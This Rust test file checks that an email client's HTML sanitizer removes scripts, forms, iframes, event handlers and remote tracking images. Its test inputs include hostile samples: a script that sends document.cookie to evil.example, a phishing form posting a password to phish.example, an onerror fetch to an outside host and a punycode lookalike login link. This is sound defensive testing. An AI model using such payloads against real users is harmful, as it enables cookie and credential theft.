//! Rendered-email HTML security analysis (threat model §7): runs the
//! sanitized HTML output through a structural HTML parser and asserts
//! the zero-trust invariants hold on the *parsed DOM*, not just string
//! matching.
//!
//! **Crawlkit note:** the original plan used `crawlkit-engine`'s
//! parser/analyzers, but crawlkit pins `libsqlite3-sys 0.30` while our
//! sqlx 0.9 needs `0.37` — the `links = "sqlite3"` attribute makes them
//! mutually exclusive in one workspace. The same structural assertions
//! are implemented here with `scraper` (html5ever DOM). When crawlkit's
//! dependency tree aligns, swap `parse_sanitized` for
//! `crawlkit_engine::parser::ParsedPage::parse` — the assertions are
//! identical.

#![allow(clippy::unwrap_used, clippy::expect_used, missing_docs)]

use kestrel_core::sanitizer::sanitize_html_body;
use scraper::{Html, Selector};

/// Parses sanitized HTML into a DOM and returns the structural summary.
fn parse_sanitized(html: &str) -> DomSummary {
    let doc = Html::parse_document(html);
    let scripts = doc.select(&Selector::parse("script").unwrap()).count();
    let forms = doc.select(&Selector::parse("form").unwrap()).count();
    let images = doc
        .select(&Selector::parse("img").unwrap())
        .filter_map(|el| el.value().attr("src").map(str::to_owned))
        .collect::<Vec<_>>();
    let links = doc
        .select(&Selector::parse("a").unwrap())
        .filter_map(|el| el.value().attr("href").map(str::to_owned))
        .collect::<Vec<_>>();
    let iframes = doc.select(&Selector::parse("iframe").unwrap()).count();
    let objects = doc.select(&Selector::parse("object").unwrap()).count();
    let embeds = doc.select(&Selector::parse("embed").unwrap()).count();
    let inputs = doc.select(&Selector::parse("input").unwrap()).count();
    DomSummary {
        scripts,
        forms,
        iframes,
        objects,
        embeds,
        inputs,
        image_srcs: images,
        link_hrefs: links,
    }
}

/// Structural DOM summary.
#[derive(Debug)]
struct DomSummary {
    scripts: usize,
    forms: usize,
    iframes: usize,
    objects: usize,
    embeds: usize,
    inputs: usize,
    image_srcs: Vec<String>,
    link_hrefs: Vec<String>,
}

impl DomSummary {
    /// All dangerous element counts must be zero.
    fn assert_no_active_content(&self, label: &str) {
        assert_eq!(self.scripts, 0, "{label}: script tags");
        assert_eq!(self.forms, 0, "{label}: form elements");
        assert_eq!(self.iframes, 0, "{label}: iframe elements");
        assert_eq!(self.objects, 0, "{label}: object elements");
        assert_eq!(self.embeds, 0, "{label}: embed elements");
        assert_eq!(self.inputs, 0, "{label}: input elements");
    }
}

#[test]
fn sanitized_html_has_no_active_content() {
    let raw = r#"<html><body>
        <script>alert("evil")</script>
        <iframe src="https://evil.example"></iframe>
        <object data="https://evil.example/swf"></object>
        <embed src="https://evil.example/media">
        <form action="https://phish.example/steal"><input type="password"></form>
        <p>legit content</p>
    </body></html>"#;
    let sanitized = sanitize_html_body(raw);
    let summary = parse_sanitized(&sanitized.html);
    summary.assert_no_active_content("script/iframe/object/embed/form test");
}

#[test]
fn sanitized_html_has_no_external_images() {
    let raw = r#"<html><body>
        <img src="https://tracker.example/pixel.gif">
        <img src="http://cdn.example/logo.png">
        <img src="cid:inline-part-1">
        <img src="data:image/png;base64,iVBORw0KGgo=">
    </body></html>"#;
    let sanitized = sanitize_html_body(raw);
    let summary = parse_sanitized(&sanitized.html);
    // All image sources must be cid: or data: (remote blocked).
    for src in &summary.image_srcs {
        assert!(
            src.starts_with("cid:") || src.starts_with("data:"),
            "external image leaked: {src}"
        );
    }
    assert!(
        summary.image_srcs.len() >= 2,
        "cid: and data: images preserved: {:?}",
        summary.image_srcs
    );
}

#[test]
fn sanitized_html_preserves_cid_links() {
    let raw = r#"<html><body>
        <a href="cid:part-1">inline attachment</a>
        <a href="https://example.org">external link</a>
    </body></html>"#;
    let sanitized = sanitize_html_body(raw);
    let summary = parse_sanitized(&sanitized.html);
    assert!(summary.link_hrefs.len() >= 2, "links preserved");
    assert!(
        summary.link_hrefs.iter().any(|h| h.starts_with("cid:")),
        "cid: link preserved: {:?}",
        summary.link_hrefs
    );
    assert!(
        summary.link_hrefs.iter().any(|h| h.starts_with("https://")),
        "https: link preserved for click-through: {:?}",
        summary.link_hrefs
    );
}

#[test]
fn sanitized_html_drops_inline_event_handlers() {
    let raw = r#"<html><body>
        <img src="cid:x" onerror="fetch('https://evil.example')">
        <div onmouseover="track()">hover me</div>
    </body></html>"#;
    let sanitized = sanitize_html_body(raw);
    let doc = Html::parse_document(&sanitized.html);
    // The img survives but onerror must be gone.
    let img_sel = Selector::parse("img").unwrap();
    for img in doc.select(&img_sel) {
        assert!(
            img.value().attr("onerror").is_none(),
            "onerror attribute leaked on img"
        );
    }
    // No form (no exfiltration path even if handler somehow survived).
    let summary = parse_sanitized(&sanitized.html);
    summary.assert_no_active_content("event handler test");
}

#[test]
fn remote_blocked_count_matches_dom() {
    let raw = r#"<html><body>
        <img src="https://a.example/1.gif">
        <img src="https://b.example/2.gif">
        <img src="https://c.example/3.gif">
        <img src="cid:ok">
    </body></html>"#;
    let sanitized = sanitize_html_body(raw);
    assert_eq!(sanitized.remote_blocked, 3);
    let summary = parse_sanitized(&sanitized.html);
    for src in &summary.image_srcs {
        assert!(
            !src.starts_with("http://") && !src.starts_with("https://"),
            "external image survived in DOM: {src}"
        );
    }
}

#[test]
fn complex_phishing_email_neutralized() {
    let raw = r#"<!DOCTYPE html>
<html>
<head><style>body{font-family:Arial}</style></head>
<body>
<h1>Security Alert</h1>
<p>Dear user, your account will be suspended. Click below:</p>
<a href="https://xn--80ak6aa92e.com/login"><button style="background:red">Verify Now</button></a>
<img src="https://tracker.example/open.gif" width="1" height="1">
<form action="https://phish.example/submit">
<input type="text" name="email" placeholder="Email">
<input type="password" name="password" placeholder="Password">
</form>
<script>document.location='https://evil.example/steal?c='+document.cookie</script>
</body></html>"#;
    let sanitized = sanitize_html_body(raw);
    let summary = parse_sanitized(&sanitized.html);
    summary.assert_no_active_content("phishing email");

    // No external tracker images.
    for src in &summary.image_srcs {
        assert!(
            src.starts_with("cid:") || src.starts_with("data:"),
            "external tracker survived: {src}"
        );
    }
    assert!(sanitized.remote_blocked >= 1, "tracker counted");

    // The punycode link survives as text (for click-through confirmation).
    assert!(
        summary.link_hrefs.iter().any(|h| h.contains("xn--")),
        "punycode link preserved for user confirmation: {:?}",
        summary.link_hrefs
    );
}

#[test]
fn sanitized_email_styled_correctly() {
    let raw = "<html><body>
        <blockquote>quoted text</blockquote>
        <p>response</p>
        <pre><code>code block</code></pre>
    </body></html>";
    let sanitized = sanitize_html_body(raw);
    let doc = Html::parse_document(&sanitized.html);
    let bq = Selector::parse("blockquote").unwrap();
    let pre = Selector::parse("pre").unwrap();
    let code = Selector::parse("code").unwrap();
    assert!(doc.select(&bq).count() >= 1, "blockquote preserved");
    assert!(doc.select(&pre).count() >= 1, "pre preserved");
    assert!(doc.select(&code).count() >= 1, "code preserved");
}
